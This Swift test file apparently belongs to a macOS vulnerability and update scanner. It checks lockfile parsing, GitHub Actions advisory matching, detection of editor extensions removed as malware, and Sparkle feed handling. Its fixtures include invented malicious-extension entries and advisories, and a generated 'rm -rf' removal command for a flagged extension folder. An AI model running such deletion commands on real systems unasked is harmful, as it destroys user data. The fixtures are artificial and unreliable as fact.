        // More project ecosystems: Swift, PHP, Dart and Flutter, .NET, Elixir and Gradle lockfiles.
        func parsed(_ file: String, _ text: String) -> [String] {
            (Lockfiles.parse("/p/" + file, data: Data(text.utf8))?.packages ?? []).map { "\($0.ecosystem) \($0.name) \($0.version) \($0.dependency ?? "-")" }
        }
        expect(parsed("Package.resolved", #"{"pins":[{"identity":"sparkle","kind":"remoteSourceControl","location":"https://github.com/sparkle-project/Sparkle","state":{"revision":"ac2d","version":"2.5.0"}},{"identity":"local","location":"https://github.com/me/branchy.git","state":{"branch":"main","revision":"ff00"}}],"version":3}"#)
               == ["SwiftURL github.com/sparkle-project/Sparkle 2.5.0 -"], "Package.resolved v3: keeps the URL's case, skips branch pins")
        expect(parsed("Package.resolved", #"{"object":{"pins":[{"package":"Vapor","repositoryURL":"git@github.com:vapor/vapor.git","state":{"version":"4.0.0"}}]},"version":1}"#)
               == ["SwiftURL github.com/vapor/vapor 4.0.0 -"], "Package.resolved v1 and git@ URLs")
        expect(Lockfiles.projectFolder("/w/App/App.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved") == "/w/App"
               && Lockfiles.projectFolder("/w/Lib/Package.resolved") == "/w/Lib", "Xcode's Package.resolved belongs to the folder holding the project")
        expect(parsed("composer.lock", #"{"packages":[{"name":"laravel/framework","version":"v8.0.0"},{"name":"acme/dev-only","version":"dev-main"}],"packages-dev":[{"name":"phpunit/phpunit","version":"9.5.0"}]}"#)
               == ["Packagist laravel/framework 8.0.0 -", "Packagist phpunit/phpunit 9.5.0 dev"], "composer.lock: v prefixes dropped, branch versions skipped, dev packages marked")
        let pubLock = """
        packages:
          http:
            dependency: "direct main"
            description:
              name: http
              url: "https://pub.dev"
            source: hosted
            version: "0.12.0"
          local_thing:
            dependency: "direct main"
            description:
              path: "../thing"
            source: path
            version: "1.0.0"
          meta:
            dependency: transitive
            source: hosted
            version: "1.9.1"
        sdks:
          dart: ">=3.0.0 <4.0.0"
        """
        expect(parsed("pubspec.lock", pubLock) == ["Pub http 0.12.0 direct", "Pub meta 1.9.1 transitive"], "pubspec.lock: hosted packages with their role; path packages skipped")
        expect(parsed("packages.lock.json", #"{"version":1,"dependencies":{"net8.0":{"Newtonsoft.Json":{"type":"Direct","requested":"[12.0.1, )","resolved":"12.0.1"},"System.Memory":{"type":"Transitive","resolved":"4.5.4"},"MyLib":{"type":"Project"}}}}"#)
               == ["NuGet Newtonsoft.Json 12.0.1 direct", "NuGet System.Memory 4.5.4 transitive"], "packages.lock.json: names keep their case; project references skipped")
        expect(parsed("mix.lock", "%{\n  \"plug\": {:hex, :plug, \"1.10.0\", \"abc\", [:mix], [], \"hexpm\", \"def\"},\n  \"mine\": {:git, \"https://x/y.git\", \"0123\", []},\n}")
               == ["Hex plug 1.10.0 -"], "mix.lock: Hex packages only")
        expect(parsed("gradle.lockfile", "# comment\ncom.fasterxml.jackson.core:jackson-databind:2.9.8=compileClasspath,runtimeClasspath\njunit:junit:4.12=testCompileClasspath,testRuntimeClasspath\nempty=annotationProcessor\n")
               == ["Maven com.fasterxml.jackson.core:jackson-databind 2.9.8 -", "Maven junit:junit 4.12 dev"], "gradle.lockfile: group:artifact names; test-only packages are dev")
        func routeFor(_ manager: String, _ ecosystem: String, _ name: String, file: String, location: String = "/w/app") -> String? {
            let item = Installation(product: "x", name: name, version: "1.0.0", path: file + "#" + name + "@1.0.0", domain: "projects", ecosystem: ecosystem, packageName: name,
                                    manager: manager, location: location, dependency: "direct", file: file)
            return Commands.commands(for: update(item, "2.0.0", kind: .security), context: .all).first?.text
        }
        expect(routeFor("swift", "SwiftURL", "github.com/sparkle-project/Sparkle", file: "/w/app/Package.resolved") == "cd /w/app && swift package update sparkle"
               && routeFor("swift", "SwiftURL", "github.com/sparkle-project/Sparkle", file: "/w/app/App.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved") == nil,
               "Swift packages update from Terminal; Xcode projects update from Xcode")
        expect(routeFor("composer", "Packagist", "laravel/framework", file: "/w/app/composer.lock") == "cd /w/app && composer update laravel/framework --with-dependencies"
               && routeFor("pub", "Pub", "http", file: "/w/app/pubspec.lock") == "cd /w/app && dart pub upgrade http"
               && routeFor("nuget", "NuGet", "Newtonsoft.Json", file: "/w/app/packages.lock.json") == "cd /w/app && dotnet add package Newtonsoft.Json --version 2.0.0"
               && routeFor("mix", "Hex", "plug", file: "/w/app/mix.lock") == "cd /w/app && mix deps.update plug", "each ecosystem gets its own update command")

        // GitHub Actions: every way a workflow can reference an action, and how each is judged.
        let workflow = """
        jobs:
          build:
            steps:
              - uses: actions/checkout@v4
              - uses: tj-actions/changed-files@v45.0.7
              - name: scan
                uses: "github/codeql-action/init@v3"
              - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.2.0
              - uses: some/thing@8e8c483db84b4bee98b60c0593521ed34d9990e8
              - uses: ./local-action
              - uses: docker://alpine:3
              - uses: owner/repo@main
        """
        expect(parsed(".github/workflows/ci.yml", workflow) == ["GitHub Actions actions/checkout v4 -", "GitHub Actions actions/setup-node v4.2.0 (commit 1d0ff46) -",
                                                                 "GitHub Actions github/codeql-action v3 -", "GitHub Actions owner/repo main -",
                                                                 "GitHub Actions some/thing commit 8e8c483 -", "GitHub Actions tj-actions/changed-files v45.0.7 -"],
               "workflow uses: lines become actions; local actions and Docker images are skipped; pinned commits keep their version comment")
        expect(Lockfiles.projectFolder("/w/app/.github/workflows/ci.yml") == "/w/app", "a workflow belongs to the project holding .github")
        let changedFiles = try JSONSerialization.jsonObject(with: Data(#"{"vulns":[{"id":"GHSA-mrrh-fwg8-r2c3","summary":"tj-actions changed-files through 45.0.7 allows remote attackers to discover secrets","aliases":["CVE-2025-30066"],"database_specific":{"severity":"HIGH"},"affected":[{"package":{"ecosystem":"GitHub Actions","name":"tj-actions/changed-files"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"46.0.1"}]}]}]},{"id":"GHSA-same-major","summary":"fixed within 3.x","affected":[{"package":{"name":"tj-actions/changed-files"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"3.0.0"},{"fixed":"3.2.1"}]}]}]}]}"#.utf8)) as! [String: Any]
        let changedAdvisories = GitHubActions.advisories(changedFiles, name: "tj-actions/changed-files")
        func judged(_ ref: String) -> String? {
            let item = Installation(product: "x", name: "tj-actions/changed-files", version: ref, path: "/w/app/.github/workflows/ci.yml#x", domain: "projects",
                                    ecosystem: "GitHub Actions", packageName: "tj-actions/changed-files", manager: "actions", location: "/w/app", file: "/w/app/.github/workflows/ci.yml")
            return GitHubActions.finding(item, advisories: changedAdvisories).map { "\($0.fixed) \($0.severity ?? "-") \($0.reason.contains("moving tag") ? "moving" : "exact")" }
        }
        expect(judged("v45.0.7") == "46.0.1 HIGH exact" && judged("45.0.7") == "46.0.1 HIGH exact", "an exact affected version gets the fix")
        expect(judged("v45") == "46.0.1 HIGH moving", "a moving major tag with no fix in that major is affected and says why")
        expect(judged("v46") == nil && judged("v46.0.1") == nil, "a moving tag whose major contains the fix, and the fixed release, are not flagged")
        expect(judged("v3") == "46.0.1 HIGH moving" && judged("v2.9.0") == "46.0.1 HIGH exact",
               "a fix inside the same major clears that advisory for the moving tag; earlier versions still hit the open-ended one")
        expect(judged("commit 8e8c483") == nil && judged("main") == nil && judged("v44.5.1 (commit 1234567)") == "46.0.1 HIGH exact",
               "bare commits and branches can't be judged; a commit's version comment can")
        expect(routeFor("actions", "GitHub Actions", "tj-actions/changed-files", file: "/w/app/.github/workflows/ci.yml").map { $0.hasPrefix("Open ci.yml") } == true,
               "an affected action opens its workflow file to change")

        // Tools installed outside Homebrew: cargo install, Ruby gems and go install programs.
        let cargoRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-cargo-\(UUID().uuidString)").path
        try FileManager.default.createDirectory(atPath: cargoRoot + "/bin", withIntermediateDirectories: true)
        try Data(#"{"installs":{"ripgrep 13.0.0 (registry+https://github.com/rust-lang/crates.io-index)":{"bins":["rg"]},"mine 0.1.0 (path+file:///Users/a/mine)":{"bins":["mine"]}}}"#.utf8)
            .write(to: URL(fileURLWithPath: cargoRoot + "/.crates2.json"))
        let crates = Inventory.cargoInstalls(root: cargoRoot)
        expect(crates.map { "\($0.name) \($0.version) \($0.ecosystem ?? "")" } == ["ripgrep 13.0.0 crates.io"], "cargo install: crates.io installs only")
        expect(Commands.commands(for: update(crates[0], "14.0.0", kind: .security)).first?.text == "cargo install ripgrep --locked", "cargo installs update by reinstalling")
        try? FileManager.default.removeItem(atPath: cargoRoot)
        expect(Inventory.gemSpec("rspec-core-3.12.0.gemspec")! == ("rspec-core", "3.12.0") && Inventory.gemSpec("nokogiri-1.15.4-arm64-darwin.gemspec")! == ("nokogiri", "1.15.4")
               && Inventory.gemSpec("net-imap-0.4.9.1.gemspec")! == ("net-imap", "0.4.9.1") && Inventory.gemSpec("README.md") == nil, "gemspec names: hyphenated names, platforms and four-part versions")
        let gemItem = Installation(product: "rubygems:net-imap", name: "net-imap", version: "0.4.9", path: "/opt/homebrew/lib/ruby/gems/3.4.0/specifications/default/net-imap-0.4.9.gemspec",
                                   domain: "packages", ecosystem: "RubyGems", packageName: "net-imap", manager: "gem", location: "/opt/homebrew/opt/ruby/bin/gem")
        expect(Commands.commands(for: update(gemItem, "0.4.20", kind: .security)).first?.text == "/opt/homebrew/opt/ruby/bin/gem update net-imap", "a gem updates with its own Ruby's gem")
        let goOutput = "/Users/a/go/bin/gopls: go1.22.0\n\tpath\tgolang.org/x/tools/gopls\n\tmod\tgolang.org/x/tools/gopls\tv0.15.0\th1:abc\n\tdep\tgolang.org/x/net\tv0.20.0\th1:def\n\tbuild\t-compiler=gc\n/Users/a/go/bin/dev: go1.22.0\n\tpath\texample.com/dev\n\tmod\texample.com/dev\t(devel)\t\n"
        let goItems = Inventory.goModules(goOutput)
        expect(goItems.map { "\($0.name) \($0.version) \($0.dependency ?? "")" } == ["golang.org/x/tools/gopls 0.15.0 direct", "golang.org/x/net 0.20.0 transitive"],
               "go version -m: the program's module and the modules built into it; development builds skipped")
        expect(Commands.commands(for: update(goItems[1], "0.23.0", kind: .security)).first?.text == "go install golang.org/x/tools/gopls@latest",
               "a vulnerable module inside a Go program is fixed by reinstalling the program")

        // Editor extensions, checked against Microsoft's list of extensions removed from its marketplace.
        let filler = (0..<120).map { "| filler.ext\($0) | 1/1/2025 | Spam |" }.joined(separator: "\n")
        let removedList = try EditorExtensions.removed("| Extension Identifier | Removal Date | Type |\n|---|---|---|\n| Evil.Theme | 10/24/2026 | Malware |\n| fake.prettier | 10/23/2026 | Impersonation |\n| junk.ads | 10/22/2026 | Spam |\n" + filler)
        expect(removedList["evil.theme"]?.reason == "Malware" && removedList["fake.prettier"]?.date == "10/23/2026", "the removed list is read, case-insensitively")
        expect((try? EditorExtensions.removed("<html>moved</html>")) == nil, "a page that isn't the list fails the check instead of reading as nothing removed")
        let extRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-ext-\(UUID().uuidString)").path
        for (folder, id) in [("vscode/evil.theme-1.0.0", ("Evil", "theme")), ("vscode/junk.ads-2.0.0", ("junk", "ads")), ("cursor/fake.prettier-3.0.0", ("fake", "prettier"))] {
            try FileManager.default.createDirectory(atPath: extRoot + "/" + folder, withIntermediateDirectories: true)
            try Data(#"{"publisher":"\#(id.0)","name":"\#(id.1)","version":"\#(folder.split(separator: "-").last!)"}"#.utf8).write(to: URL(fileURLWithPath: extRoot + "/" + folder + "/package.json"))
        }
        try Data("[]".utf8).write(to: URL(fileURLWithPath: extRoot + "/vscode/extensions.json"))
        let installedExtensions = Inventory.editorExtensions(roots: [("VS Code", extRoot + "/vscode", "/usr/bin/true"), ("Cursor", extRoot + "/cursor", extRoot + "/missing-cli")])
        expect(installedExtensions.map { "\($0.package!) \($0.name) \($0.version)" }.sorted() == ["Cursor fake.prettier 3.0.0", "VS Code Evil.theme 1.0.0", "VS Code junk.ads 2.0.0"],
               "extensions are read from each editor's folder by publisher.name")
        let extensionFindings = EditorExtensions.findings(installedExtensions, removed: removedList)
        let evilExtension = extensionFindings.first { $0.installation.name == "Evil.theme" }, fake = extensionFindings.first { $0.installation.name == "fake.prettier" }
        expect(extensionFindings.count == 2 && evilExtension?.malicious == true && evilExtension?.severity == "CRITICAL" && fake?.severity == "HIGH" && fake?.malicious == nil
               && fake?.reason.contains("Open VSX") == true, "malware is critical; impersonation is high; spam is ignored; Open VSX editors carry the caveat")
        expect(Commands.commands(for: evilExtension!).first?.text == "/usr/bin/true --uninstall-extension Evil.theme"
               && Commands.commands(for: fake!).first?.text == "rm -rf " + Shell.quote(extRoot + "/cursor/fake.prettier-3.0.0"), "uninstall with the editor's tool, or delete the folder when it isn't installed")
        try? FileManager.default.removeItem(atPath: extRoot)

        // Sparkle: self-updating apps' own feeds, and the Sparkle framework bundled inside apps.
        let appcast = Data("""
        <?xml version="1.0" encoding="utf-8"?>
        <rss version="2.0" xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle">
          <channel>
            <item><title>2.0.4</title><sparkle:version>111</sparkle:version><sparkle:shortVersionString>2.0.4</sparkle:shortVersionString>
              <sparkle:minimumSystemVersion>14.0</sparkle:minimumSystemVersion><enclosure url="https://example.com/a.zip" length="1" type="application/octet-stream"/></item>
            <item><title>2.1 beta</title><sparkle:version>120</sparkle:version><sparkle:shortVersionString>2.1b1</sparkle:shortVersionString><sparkle:channel>beta</sparkle:channel>
              <enclosure url="https://example.com/b.zip"/></item>
            <item><title>Windows</title><enclosure url="https://example.com/w.exe" sparkle:version="130" sparkle:os="windows"/></item>
            <item><title>2.0.3</title><enclosure url="https://example.com/c.zip" sparkle:version="110" sparkle:shortVersionString="2.0.3"/></item>
          </channel>
        </rss>
        """.utf8)
        let feedReleases = SparkleFeeds.releases(appcast)
        expect(feedReleases == [SparkleFeeds.Release(build: "111", version: "2.0.4", minimumSystem: "14.0"), SparkleFeeds.Release(build: "110", version: "2.0.3", minimumSystem: nil)],
               "appcast items in both layouts; beta channels and other platforms skipped")
        expect(SparkleFeeds.newest(feedReleases, system: "Version 27.0 (Build 27A1)")?.version == "2.0.4" && SparkleFeeds.newest(feedReleases, system: "Version 13.6 (Build 22G1)")?.version == "2.0.3",
               "releases needing a newer macOS are skipped")
        expect(SparkleFeeds.releases(Data("<rss><item>".utf8)).isEmpty, "a broken feed yields nothing")
        let feedApp = Installation(product: "app:com.example.rect", name: "Rectangle", version: "0.94", path: "/Applications/Rectangle.app", domain: "apps", manager: "app", build: "100", feed: "https://example.com/updates.xml")
        let feedFinding = SparkleFeeds.finding(feedApp, releases: feedReleases, system: "Version 27.0 (Build 27A1)")
        expect(feedFinding?.fixed == "2.0.4" && feedFinding?.kind == .update && feedFinding?.reason.contains("(build 111)") == true
               && Commands.commands(for: feedFinding!).first.map { $0.kind == "app" && $0.text == "Open Rectangle" } == true, "an older build gets an update that opens the app's own updater")
        var currentApp = feedApp; currentApp.build = "111"
        expect(SparkleFeeds.finding(currentApp, releases: feedReleases, system: "Version 27.0 (Build 27A1)") == nil, "an app at the feed's newest build has no update")
        expect(Inventory.trimmedSparkleVersion("1.27.1-3-g05be1d71") == "1.27.1" && Inventory.trimmedSparkleVersion("1.22.0 1354-g4e0506a") == "1.22.0"
               && Inventory.trimmedSparkleVersion("2.7.0-beta.1") == "2.7.0-beta.1" && Inventory.trimmedSparkleVersion("2.10.0") == "2.10.0", "bundled Sparkle versions lose build suffixes, keep prerelease tags")
        let appsRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-apps-\(UUID().uuidString)").path
        func makeApp(_ name: String, _ info: [String: String], sparkle: String? = nil, appStore: Bool = false) throws {
            let contents = appsRoot + "/" + name + ".app/Contents"
            try FileManager.default.createDirectory(atPath: contents, withIntermediateDirectories: true)
            try PropertyListSerialization.data(fromPropertyList: info, format: .xml, options: 0).write(to: URL(fileURLWithPath: contents + "/Info.plist"))
            if let sparkle {
                let resources = contents + "/Frameworks/Sparkle.framework/Versions/A/Resources"
                try FileManager.default.createDirectory(atPath: resources, withIntermediateDirectories: true)
                try PropertyListSerialization.data(fromPropertyList: ["CFBundleShortVersionString": sparkle], format: .xml, options: 0).write(to: URL(fileURLWithPath: resources + "/Info.plist"))
            }
            if appStore { try FileManager.default.createDirectory(atPath: contents + "/_MASReceipt", withIntermediateDirectories: true); try Data().write(to: URL(fileURLWithPath: contents + "/_MASReceipt/receipt")) }
        }
        try makeApp("Tidy", ["CFBundleIdentifier": "com.example.tidy", "CFBundleShortVersionString": "1.2", "CFBundleVersion": "42", "SUFeedURL": "https://example.com/tidy.xml"], sparkle: "1.27.1-3-g05be1d71")
        try makeApp("Plain", ["CFBundleIdentifier": "com.example.plain", "CFBundleShortVersionString": "3.0", "SUFeedURL": "http://example.com/plain.xml"])
        try makeApp("Store", ["CFBundleIdentifier": "com.example.store", "CFBundleShortVersionString": "1.0", "SUFeedURL": "https://example.com/s.xml"], sparkle: "2.0.0", appStore: true)
        let (sparkleApps, _, appStoreSkipped) = Inventory.apps(roots: [appsRoot])
        expect(sparkleApps.map { "\($0.name) \($0.version) \($0.manager!) \($0.build ?? "-") \($0.feed ?? "-")" }
               == ["Tidy 1.2 app 42 https://example.com/tidy.xml", "Sparkle in Tidy 1.27.1 sparkle-framework - -"] && appStoreSkipped == 1,
               "apps with an https feed or a bundled Sparkle are kept; an http feed alone isn't; App Store apps are skipped")
        let bundled = update(sparkleApps[1], "2.9.2", kind: .security)
        expect(Commands.commands(for: bundled).first.map { $0.kind == "app" && $0.text == "Open Tidy" && $0.target?.hasSuffix("/Tidy.app") == true } == true
               && Commands.action(for: sparkleApps[1], malicious: false, fixed: "2.9.2").hasPrefix("Update Tidy to a release that bundles Sparkle 2.9.2 or later"),
               "a vulnerable bundled Sparkle is fixed by updating the app that contains it")
        expect(sparkleApps[1].note.contains("a modified Sparkle build, 1.27.1 plus 3 changes"), "a Sparkle with changes on top of a release says so on its card")
        expect(Inventory.sparkleChanges("1.22.0 1354-g4e0506a") == 1354 && Inventory.sparkleChanges("1.27.1-3-g05be1d71") == 3
               && Inventory.sparkleChanges("2.7.0-beta.1") == nil && Inventory.sparkleChanges("2.10.0") == nil, "build suffixes give the number of changes; releases and prereleases have none")
        try? FileManager.default.removeItem(atPath: appsRoot)

        // Bundled Sparkle in an app that is already current: nothing to install until the developer ships a fix.
        let sparkleItem = Installation(product: "swifturl:github.com/sparkle-project/Sparkle", name: "Sparkle in Folx", version: "1.20.0", path: "/Applications/Folx.app/Contents/Frameworks/Sparkle.framework",
                                       domain: "apps", ecosystem: "SwiftURL", packageName: "github.com/sparkle-project/Sparkle", manager: "sparkle-framework", location: "/Applications/Folx.app")
        let sparkleTarget = "SwiftURL|github.com/sparkle-project/Sparkle"
        let sparkleVulns = ["GHSA-a": OSV.Vuln(id: "GHSA-a", summary: "Signing checks bypass", aliases: [], severity: "HIGH", fixed: [sparkleTarget: ["2.6.4"]]),
                            "GHSA-b": OSV.Vuln(id: "GHSA-b", summary: "XPC listener accepts unvalidated connections", aliases: [], severity: "MODERATE", fixed: [:])]
        var sparkleFindings = OSV.findings(for: [sparkleItem], matches: [OSV.key(sparkleItem)!: ["GHSA-a", "GHSA-b"]], vulns: sparkleVulns)
        expect(sparkleFindings.first?.reason == "2 published advisories: Signing checks bypass; XPC listener accepts unvalidated connections. 1 has no published fix.",
               "advisory titles end with a period before the count of advisories with no fix")
        expect(SparkleFeeds.current(currentApp, releases: feedReleases, system: "Version 27.0 (Build 27A1)") && !SparkleFeeds.current(feedApp, releases: feedReleases, system: "Version 27.0 (Build 27A1)")
               && !SparkleFeeds.current(currentApp, releases: [], system: "Version 27.0 (Build 27A1)"), "an app is current only when its feed offers nothing newer")
        var otherApps = sparkleFindings
        Scanner.markSparkleAwaiting(&otherApps, currentApps: ["/Applications/Rectangle.app"])
        expect(otherApps.first?.awaitingFix == nil && Commands.commands(for: otherApps[0]).first?.text == "Open Folx", "an app with a newer release keeps its Open button")
        Scanner.markSparkleAwaiting(&sparkleFindings, currentApps: ["/Applications/Folx.app"])
        let waitingSparkle = sparkleFindings[0]
        expect(waitingSparkle.awaitingFix == true && waitingSparkle.fixed == "2.6.4, not in Folx yet" && waitingSparkle.action.hasPrefix("You have the newest Folx, and it still bundles Sparkle 1.20.0")
               && Commands.commands(for: waitingSparkle).isEmpty, "a current app's bundled Sparkle has no button and says only the developer can fix it")
        expect(ScanReport(findings: sparkleFindings).security.isEmpty && ScanReport(findings: sparkleFindings).awaiting.count == 1, "it waits in No fix released yet instead of counting as needing attention")

        // Project scans skip app bundles and package-manager internals such as Homebrew's own Library.
        let scanRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-scan-\(UUID().uuidString)").path
        for (folder, file) in [("app", "package-lock.json"), ("Tool.app/Contents", "package-lock.json"), ("homebrew/Library/formula-analytics", "uv.lock")] {
            try FileManager.default.createDirectory(atPath: scanRoot + "/" + folder, withIntermediateDirectories: true)
            try Data("{}".utf8).write(to: URL(fileURLWithPath: scanRoot + "/" + folder + "/" + file))
        }
        expect(Lockfiles.find(in: scanRoot, skipping: [scanRoot + "/homebrew"]) == [scanRoot + "/app/package-lock.json"], "app bundles and skipped roots aren't scanned as projects")
        expect(Lockfiles.find(in: scanRoot + "/homebrew", skipping: [scanRoot + "/homebrew"]).count == 1, "a folder chosen inside a skipped root is still checked")
        expect(Lockfiles.skippedRoots.isSuperset(of: ["/opt/homebrew", "/usr", Inventory.home + "/Library"]), "Homebrew, /usr and ~/Library are skipped by default")
        try? FileManager.default.removeItem(atPath: scanRoot)


        let summer = ISO8601DateFormatter().date(from: "2026-10-24T16:00:00Z")!
        let winter = ISO8601DateFormatter().date(from: "2026-12-24T17:00:00Z")!
        expect(Schedule.isDue(now: summer, lastDay: nil), "9 a.m. PDT")
        expect(Schedule.isDue(now: winter, lastDay: nil), "9 a.m. PST")
        expect(!Schedule.isDue(now: summer.addingTimeInterval(-60), lastDay: nil), "not before scheduled time")
        expect(!Schedule.isDue(now: summer, lastDay: Schedule.day(summer)), "once per Pacific day")
        expect(Schedule.isDue(now: summer.addingTimeInterval(3600 * 4), lastDay: nil), "catch up after sleep")

        // Optional live-format fixtures are kept outside the distributable app.
        let root = CommandLine.arguments.count > 1 ? CommandLine.arguments[1] : "native/work"
        if let data = FileManager.default.contents(atPath: root + "/bun.txt") {
            let rows = try JSONSerialization.jsonObject(with: data) as! [[String: Any]]
            let finding = try Rules.bun(item("bun", "1.3.13"), advisories: rows)
            expect(finding?.fixed == "1.4.4", "current Bun vendor fixture")
            expect(finding?.advisories.contains("GHSA-cf8x-9m69-3gg3") == false, "new HTTP3 issue correctly excluded")
        }
        if let html = try? String(contentsOfFile: root + "/postgres.txt", encoding: .utf8) { try expect(Rules.postgres(item("postgresql", "16.13"), html: html)?.fixed == "16.15", "current Postgres vendor fixture") }
        if let html = try? String(contentsOfFile: root + "/openssl-index.txt", encoding: .utf8) {
            let branches = Rules.opensslIndexedBranches(html)
            expect(branches.contains("3.6") && branches.contains("3.0") && branches.count >= 10, "current OpenSSL index fixture lists release branches")
        }
        if let html = try? String(contentsOfFile: root + "/openssl.txt", encoding: .utf8) { try expect(Rules.openssl(item("openssl", "3.6.4"), html: html)?.fixed == "3.6.5", "current OpenSSL vendor fixture") }
        print("Passed \(count) rule, failure-retention, notification-fingerprint and scheduling checks")
    }
}

// Serves canned responses to Fetch in tests, delivered in 64 KB chunks like a real transfer.
final class StubProtocol: URLProtocol {
    static var responses: [String: (status: Int, headers: [String: String], body: Data)] = [:]
    override class func canInit(with request: URLRequest) -> Bool { true }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }
    override func startLoading() {
        let stub = Self.responses[request.url!.absoluteString] ?? (404, [:], Data())
        client?.urlProtocol(self, didReceive: HTTPURLResponse(url: request.url!, statusCode: stub.status, httpVersion: "HTTP/1.1", headerFields: stub.headers)!, cacheStoragePolicy: .notAllowed)
        var offset = 0
        while offset < stub.body.count {
            let end = min(offset + 65_536, stub.body.count)
            client?.urlProtocol(self, didLoad: stub.body.subdata(in: offset..<end))
            offset = end
        }
        client?.urlProtocolDidFinishLoading(self)
    }
    override func stopLoading() {}
}
